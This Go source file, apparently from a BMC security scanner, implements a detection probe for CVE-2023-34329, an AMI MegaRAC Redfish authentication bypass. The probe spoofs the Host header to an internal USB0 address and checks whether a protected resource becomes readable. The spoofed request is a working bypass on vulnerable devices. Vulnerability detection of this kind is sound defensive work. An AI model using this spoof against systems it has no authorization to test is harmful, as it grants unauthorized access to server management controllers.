package redfish

import (
	"context"
	"io"
	"net/http"
	"time"
)

// CVE-2023-34329 is the AMI MegaRAC Redfish "authentication bypass via HTTP
// header spoofing" (BMC&C Part 2, CVSS 9.1). The published Eclypsium detector
// replaces the Host header with the trusted Redfish Host-Interface / USB0
// address (169.254.0.17), causing the vulnerable handler to skip auth.
//
// The distinguishing header from the later CVE-2024-54085 (X-Server-Addr:
// 169.254.0.17:, handled in probe.go) is that this flaw spoofs Host itself.
//
// This active probe only issues GETs, never the account-creation POST. It
// asserts on a differential read of an admin-scoped resource, not write access.

// cve34329InternalIP is the Host-Interface / USB0 address the vulnerable handler
// trusts when supplied as the request Host.
const cve34329InternalIP = "169.254.0.17"

// CVE202334329Result is the outcome of the header-spoof differential probe.
type CVE202334329Result struct {
	Vulnerable   bool
	PlainStatus  int    // status of the unspoofed request (expected 401/403)
	SpoofStatus  int    // status once the internal-IP header is injected
	Path         string // resource probed
	Snippet      string // bounded preview of the spoofed response body
	SpoofHeaders map[string]string
}

// CheckCVE202334329 runs the CVE-2023-34329 host-header-spoof auth-bypass
// differential against host (default :443). It mirrors Eclypsium's published
// detector by comparing GET /redfish/v1/Systems with the normal Host against the
// same GET with Host replaced by 169.254.0.17. A vulnerable BMC denies the plain
// request but returns a genuine Redfish resource once Host is spoofed.
func CheckCVE202334329(host string, port int, timeout time.Duration) CVE202334329Result {
	base := baseURL(host, port)
	client := insecureClient(nil, timeout)
	const path = "/redfish/v1/Systems"
	url := base + path

	res := CVE202334329Result{Path: path}

	// Plain, unauthenticated GET: the differential baseline (must be denied).
	plainStatus, _ := authGet(client, url, nil, timeout)
	res.PlainStatus = plainStatus

	// Spoofed GET: replace only Host, exactly as the published detector does.
	// Keeping the two CVE probes isolated prevents one bypass from being
	// misattributed to the other.
	spoof := map[string]string{
		"Host": cve34329InternalIP,
	}
	res.SpoofHeaders = spoof
	spoofStatus, spoofBody := getWithSpoofHost(client, url, spoof, timeout)
	res.SpoofStatus = spoofStatus
	res.Snippet = bypassSnippet(spoofBody)
	res.Vulnerable = cve34329Verdict(plainStatus, spoofStatus, spoofBody)
	return res
}

// cve34329Verdict implements the differential decision, separated for unit
// testing without a live BMC. A vulnerable box denies the anonymous request but
// serves a genuine Redfish resource (not a login page) once the internal-IP
// header is injected. A patched box denies both; a box that serves the resource
// unauth (plain 2xx) is not attributable to this bug.
func cve34329Verdict(plainStatus, spoofStatus int, spoofBody []byte) bool {
	if plainStatus >= 200 && plainStatus < 300 {
		return false // readable unauth already; not this bypass
	}
	if spoofStatus < 200 || spoofStatus >= 300 {
		return false
	}
	return looksLikeRedfish(spoofBody) && !looksLikeLogin(spoofBody)
}

// getWithSpoofHost issues a GET setting a spoofed Host header (which the stdlib
// treats specially via Request.Host) plus the other spoof headers, and returns
// the status + bounded body.
func getWithSpoofHost(c *http.Client, url string, headers map[string]string, timeout time.Duration) (int, []byte) {
	// getWithHeaders in probe.go sets Host via req.Header, which net/http ignores;
	// the Host header must go through req.Host. Reuse authGet for the rest but
	// handle Host explicitly here.
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, nil
	}
	for k, v := range headers {
		if k == "Host" {
			req.Host = v // net/http honors Request.Host, not the Host header field
			continue
		}
		req.Header.Set(k, v)
	}
	resp, err := c.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 262144))
	return resp.StatusCode, body
}
